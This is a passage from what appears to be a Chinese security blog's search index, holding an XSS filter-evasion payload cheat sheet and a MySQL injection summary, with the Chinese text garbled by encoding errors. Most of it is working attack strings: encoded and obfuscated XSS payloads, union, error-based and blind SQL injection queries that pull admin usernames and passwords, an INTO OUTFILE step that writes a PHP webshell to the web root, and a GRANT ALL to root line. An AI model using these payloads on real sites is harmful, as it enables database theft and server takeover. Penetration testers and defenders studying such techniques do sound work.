to \x20) &lt;iframe src=&quot;\x01javascript:alert(0)&quot;&gt;&lt;/iframe&gt; &lt;!-- Example for Chrome --&gt; &lt;img src=&apos;1&apos; onerror=&apos;alert(0)&apos; &lt; &lt;&lt;script&gt;alert(0)&lt;/script&gt; &lt;style&gt;body{background-color:expression\(alert(1))}&lt;/style&gt; &lt;script&gt;document.write(&apos;&lt;a hr\ef=j\avas\cript\:a\lert(2)&gt;blah&lt;/a&gt;&apos;);&lt;/script&gt; HTML Encoding &lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt; &lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt; &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;&lt;/iframe&gt; URL Encoding &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/iframe&gt; CSS Hexadecimal Encoding &lt;div style=&quot;x:expression(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029&quot;&gt;Joker&lt;/div&gt; JavaScript &lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E&apos;);&lt;/script&gt; JavaScript &lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt; &lt;script&gt;document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));&lt;/script&gt; JavaScript &lt;script&gt;alert(123)&lt;/script&gt; &lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;/script&gt; Overlong UTF-8 &lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC &gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE &apos; = %C0%A7 = %E0%80%A7 = %F0%80%80%A7 &quot; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2 &lt;img src=&quot;1&quot; onnerror=&quot;alert(1)&quot;&gt; %E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE UTF-7 (Missing charset?) &lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt; +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4- Unicode .NET Ugliness &lt;script&gt;alert(1)&lt;/script&gt; %uff1cscript%uff1ealert(1)%uff1c/script%uff1e Classic ASP &lt;img src=&quot;1&quot; onerror=&quot;alert(&apos;1&apos;)&quot;&gt; %u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A and/or Useful features. HTML 5 (Not comphrensive) &lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadedmetadata=&quot;alert(1)&quot; /&gt; &lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadstart=&quot;alert(1)&quot; /&gt; Usuage of non-existent elements &lt;blah style=&quot;blah:expression(alert(1))&quot; /&gt; CSS Comments &lt;div style=&quot;z:exp/*anything*/res/*here*/sion(alert(1))&quot; /&gt; JavaScript functions &lt;script&gt;window[&apos;alert&apos;](0)&lt;/script&gt; &lt;script&gt;parent[&apos;alert&apos;](1)&lt;/script&gt; &lt;script&gt;self[&apos;alert&apos;](2)&lt;/script&gt; &lt;script&gt;top[&apos;alert&apos;](3)&lt;/script&gt; JavaScript into HTML &lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)&gt; &lt;script&gt; var junk = &apos;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;; &lt;/script&gt; HTML CSS &lt;style&gt; body { background-image:url(&apos;http://www.blah.com/&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;); } &lt;/style&gt; XML documents &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;someElement&gt; &lt;a xmlns:a=&apos;http://www.w3.org/1999/xhtml&apos;&gt;&lt;a:body onload=&apos;alert(1)&apos;/&gt;&lt;/a&gt; &lt;/someElement&gt; URI Schemes &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt; (IE) &lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari) &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari) HTTP Parameter Pollution http://target.com/something.xxx?a=val1&amp;a=val2 ASP.NET a = val1,val2 ASP a = val1,val2 JSP a = val1 PHP a = val2 &lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt; &lt;script&gt;eval(location.hash)&lt;/script&gt; (Firefox) http://target.com/something.jsp?inject=&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#alert(1) &lt;iframe src=&quot;http://target.com/something.jsp?inject=&lt;script&gt;eval(name)&lt;/script&gt;&quot; name=&quot;alert(1)&quot;&gt;&lt;/iframe&gt; &lt;script&gt; $=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())(); &lt;/script&gt; &lt;script&gt; (+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])() &lt;/script&gt; `]]></content>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>XSS</tag>
        <tag>WAFç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysqlæ³¨å…¥æ€»ç»“]]></title>
    <url>%2F2016%2F08%2F02%2FMysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[mysqlä¸€èˆ¬æ³¨å…¥(select)ï¼Œmysqlä¸€èˆ¬æ³¨å…¥(insertã€update)ï¼ŒmysqlæŠ¥é”™æ³¨å…¥ï¼Œmysqlä¸€èˆ¬ç›²æ³¨ï¼Œmysqlæ—¶é—´ç›²æ³¨ï¼Œmysqlçš„ä¸€äº›ç‰¹æ€§åœ¨SQLæ³¨å…¥ä¸­çš„åˆ©ç”¨ã€‚ 0x00 mysqlä¸€èˆ¬æ³¨å…¥(select)1.æ³¨é‡Šç¬¦:#,/*,-- 2.è¿‡æ»¤ç©ºæ ¼æ³¨å…¥ä½¿ç”¨/**/æˆ–()æˆ–+ä»£æ›¿ç©ºæ ¼ %0c = form feed, new page %09 = horizontal tab %0d = carriage return %0a = line feed, new line 3.å¤šæ¡æ•°æ®æ˜¾ç¤º concat() group_concat() concat_ws() 4.ç›¸å…³å‡½æ•° system_user() ç³»ç»Ÿç”¨æˆ·å user() ç”¨æˆ·å current_user å½“å‰ç”¨æˆ·å session_user()è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å database() æ•°æ®åº“å version() MYSQLæ•°æ®åº“ç‰ˆæœ¬ load_file() MYSQLè¯»å–æœ¬åœ°æ–‡ä»¶çš„å‡½æ•° @@datadir è¯»å–æ•°æ®åº“è·¯å¾„ @@basedir MYSQL å®‰è£…è·¯å¾„ @@version_compile_os æ“ä½œç³»ç»Ÿ GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION; 5.mysqlä¸€èˆ¬æ³¨å…¥è¯­å¥ çŒœå­—æ®µæ•° order by n# æŸ¥çœ‹mysqlåŸºæœ¬ä¿¡æ¯ and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7# æŸ¥è¯¢æ•°æ®åº“ and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1# and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata# æŸ¥è¯¢è¡¨å and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=æ•°æ®åº“çš„16è¿›åˆ¶ç¼–ç  limit 1,1# and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=æ•°æ®åº“çš„16è¿›åˆ¶ç¼–ç # æŸ¥è¯¢å­—æ®µ and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=è¡¨åçš„åå…­è¿›åˆ¶ç¼–ç  and table_schema=æ•°æ®åº“çš„16è¿›åˆ¶ç¼–ç  limit 1,1# and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=è¡¨åçš„åå…­è¿›åˆ¶ç¼–ç  and table_schema=æ•°æ®åº“çš„16è¿›åˆ¶ç¼–ç # æŸ¥è¯¢æ•°æ® and 1=2 union select 1,2,3,å­—æ®µ1,5,å­—æ®µ2,7,8 from æ•°æ®åº“.è¡¨# åˆ¤æ–­æ˜¯å¦å…·æœ‰è¯»å†™æƒé™ and (select count(*) from mysql.user)&gt;0# è¯»æƒé™ and (select count(file_priv) from mysql.user)&gt;0# å†™æƒé™ 6.mysqlè¯»å–å†™å…¥æ–‡ä»¶ å¿…å¤‡æ¡ä»¶ï¼š è¯»ï¼šfileæƒé™å¿…å¤‡ å†™ï¼š1.ç»å¯¹è·¯å¾„ 2.unionä½¿ç”¨ 3. å¯ä»¥ä½¿ç”¨&apos;&apos; â€”â€”â€”â€”â€”â€”â€”â€”-è¯»â€”â€”â€”â€”â€”â€”â€”- mysql3.xè¯»å–æ–¹æ³• create table a(å‘½ä»¤ æ–‡æœ¬å); load data infile &apos;c:\\xxx\\xxx\\xxx.txt&apos; into table a; select * from a; mysql4.xè¯»å–æ–¹æ³• é™¤ä¸Šè¿°æ–¹æ³•è¿˜å¯ä»¥ä½¿ç”¨load_file() create table a(å‘½ä»¤ æ–‡æœ¬å); insert into a(å‘½ä»¤) values(load_file(&apos;c:\\ddd\\ddd\\ddd.txt&apos;)); select * from a; mysql5.xè¯»å–æ–¹æ³• ä¸Šè¿°ä¸¤ç§éƒ½å¯ä»¥ è¯»å–æ–‡ä»¶æŠ€å·§ï¼š load_file(char(32,26,56,66)) load_file(0x633A5C626F6F742E696E69) c:\boot.ini â€”â€”â€”â€”â€”â€”â€”â€”-å†™â€”â€”â€”â€”â€”â€”â€”- into outfileå†™æ–‡ä»¶ union select 1,2,3,char(è¿™é‡Œå†™å…¥ä½ è½¬æ¢æˆ10è¿›åˆ¶æˆ–16è¿›åˆ¶çš„ä¸€å¥è¯æœ¨é©¬ä»£ç ),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;# union select 1,2,3,load_file(&apos;d:\web\logo123.jpg&apos;),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;# 0x01 mysqlä¸€èˆ¬æ³¨å…¥(insertã€update)ä¸€èˆ¬æƒ…å†µåŒä¸Š mysqlä¸€èˆ¬è¯·æ±‚mysql_queryä¸æ”¯æŒå¤šè¯­å¥æ‰§è¡Œï¼Œmysqliå¯ä»¥ã€‚ insertæ³¨å…¥å¤šä½¿ç”¨æŠ¥é”™æ³¨å…¥! 1.å¦‚æœå¯ä»¥ç›´æ¥æ’å…¥ç®¡ç†å‘˜å¯ä»¥ç›´æ¥ä½¿ç”¨! insert into user(username,password) values(&apos;xxxx&apos;,&apos; xxxx&apos;),(&apos;dddd&apos;,&apos;dddd&apos;)/* &apos;); 2.å¦‚æœå¯ä»¥æ’å…¥ä¸€äº›æ•°æ®ï¼Œè¿™äº›æ•°æ®ä¼šåœ¨ç½‘é¡µä¸­æ˜¾ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆxxså’Œcsrfæ¥è·å–cookiesæˆ–getshell updateæ³¨å…¥åŒä¸Š 0x02 mysqlæŠ¥é”™æ³¨å…¥1ã€é€šè¿‡flooræš´é”™FLOOR(x)å‡½æ•°ç”¨äºè¿”å›å°äºæˆ–ç­‰äºxçš„æœ€å¤§æ•´æ•°å€¼ã€‚ é€šè¿‡flooræŠ¥é”™çš„æ–¹æ³•æ¥çˆ†æ•°æ®çš„æœ¬è´¨æ˜¯group byè¯­å¥çš„æŠ¥é”™ã€‚group byè¯­å¥æŠ¥é”™çš„åŸå› æ˜¯floor (random(0)*2)çš„ä¸ç¡®å®šæ€§ï¼Œå³å¯èƒ½ä¸º0ä¹Ÿå¯èƒ½ä¸º1ï¼ˆgroup by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€ è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚ group by floor(random(0)*2)å‡ºé”™çš„åŸå› æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹floor(random(0)*2)å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨åªæœ‰keyä¸º1çš„è¡Œï¼Œä¸å­˜åœ¨keyä¸º0çš„è¡Œï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•æ’å…¥ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶floor(random(0)*2)ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶å†²çªè€ŒæŠ¥é”™ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ã€‚ å…·ä½“åŸç†å‚è€ƒï¼šhttp://www.mysqlops.com/2012/05/15/mysql-sql-analyze.htmlï¼‰ã€‚ å¸¸ç”¨è¯­å¥ï¼š æ•°æ®åº“ç‰ˆæœ¬ ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) ç®€å•åŠæ³•çˆ†åº“ ?id=info() çˆ†ç”¨æˆ· ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) çˆ†æ•°æ®åº“å ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) çˆ†åº“ ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) çˆ†è¡¨ ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) çˆ†å­—æ®µ ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) çˆ†å†…å®¹ ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) æ³¨ï¼šä½¿ç”¨group byæŠ¥é”™æ³¨å…¥æ–¹å¼çš„æ³¨æ„äº‹é¡¹ (1)æŠ¥é”™è¯­å¥ä¸­çš„count(*)ä¸å¯ç¼ºå°‘ã€‚ (2)from è¡¨ä¹Ÿä¸å¯ç¼ºå°‘ã€‚ 2ã€ExtractValue(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½)ExtractValue()å‡½æ•°æ˜¯å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ã€‚ extractvalue()å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåœ¨å®é™…æ³¨å…¥æ—¶ç¬¬ä¸€ä¸ªå‚æ•°è®¾ä¸º1ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯éœ€è¦çˆ†çš„æ•°æ®ã€‚ å¦‚ï¼šextractvalue(1, concat(0x5c,version()))ã€‚ åŒæ ·ï¼Œåœ¨ä½¿ç”¨ä¸­ä¼šé‡åˆ°å¦‚ä¸‹é¢UpdateXml()ç±»ä¼¼çš„ç›¸åŒé—®é¢˜ï¼Œå³å¦‚æœåœ¨çˆ†çš„æ•°æ®å‰ä¸è¿æ¥å…¶ä»–å­—ç¬¦å¯èƒ½ä¼šæ˜¾ç¤ºä¸å®Œå…¨ã€‚å³è·å–ç‰ˆæœ¬å·æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸èƒ½ä¸ºversion(),è€Œåº”æ”¹ä¸ºconcat(0x5c,version()) å¸¸ç”¨è¯­å¥ï¼š ?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e)) ?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) 3ã€UpdateXml(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½)UpdateXml()å‡½æ•°ä¹Ÿæ˜¯æ˜¯å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ã€‚ UpdateXml()å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåœ¨å®é™…æ¸—é€æ—¶ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ç›´æ¥å†™1å³å¯ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯éœ€è¦çˆ†å‡ºçš„å†…å®¹ï¼Œè¦çˆ†å‡ºä¸åŒçš„å†…å®¹ç›´æ¥ä¿®æ”¹ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚ä½†æ˜¯åœ¨å®é™…ä½¿ç”¨æ—¶æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼šå³çˆ†é”™çš„å†…å®¹å¯èƒ½æ˜¾ç¤ºä¸å®Œæ•´ã€‚ å¸¸ç”¨è¯­å¥ï¼š ?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) ?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) 4ã€NAME_CONST(é€‚ç”¨äºä½ç‰ˆæœ¬)?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)-- ä¸å¥½ç”¨ 5ã€Error based Double Query Injectionæ•°æ®åº“ç‰ˆæœ¬ ?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 0x03 mysqlä¸€èˆ¬ç›²æ³¨ä½¿ç”¨ascii AND ascii(substring((SELECT password FROM users where id=1),1,1))=49 ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &apos;^[a-n]&apos; LIMIT 0,1) ç›²æ³¨æ²¡ä»€ä¹ˆè¯´çš„ï¼Œå°±æ˜¯åˆ©ç”¨æ˜¯å¦ç­‰äºï¼Œè¿™äº›å‡½æ•°åˆ¤æ–­asciiç ï¼Œè„šæœ¬è·‘å‘—ï¼Œæˆ–è€…sqlmap 0x04 mysqlæ—¶é—´ç›²æ³¨æ—¶é—´ç›²æ³¨ç”¨ä¸¤ä¸ªå‡½æ•°ä¸€ä¸ªæ˜¯sleep,ä¸€ä¸ªæ˜¯benchmarkï¼Œsleepå°±ä¸è¯´äº†ã€‚ benchmarkè¯­æ³•ï¼š BENCHMARK(count,expr) BENCHMARK()å‡½æ•°é‡å¤countTimesæ¬¡æ‰§è¡Œè¡¨è¾¾å¼expr å¸¸ç”¨è¯­å¥ï¼š union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(&apos;msg&apos;,&apos;by 5 seconds&apos;)),null) from (select database() as current) as tbl UNION SELECT IF(SUBSTRING(Password,1,1)=&apos;a&apos;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = &apos;root&apos; 0x05 mysqlçš„ä¸€äº›ç‰¹æ€§åœ¨SQLæ³¨å…¥ä¸­çš„åˆ©ç”¨1ã€å¤§å°å†™åˆ©ç”¨ä¸ç®¡ä½ è¡¨å•å¡«å†™çš„æ˜¯ä»€ä¹ˆï¼Œæ’å…¥åˆ°mysqlæ•°æ®åº“çš„æ—¶å€™ï¼Œéƒ½ä¼šå˜æˆå°å†™ã€‚ å¦‚ï¼šæ³¨å†Œadminæ—¶æ˜¾ç¤ºç”¨æˆ·å·²å­˜åœ¨ï¼Œä½ å¯ä»¥å°è¯•ADMINæ³¨å†Œã€‚ 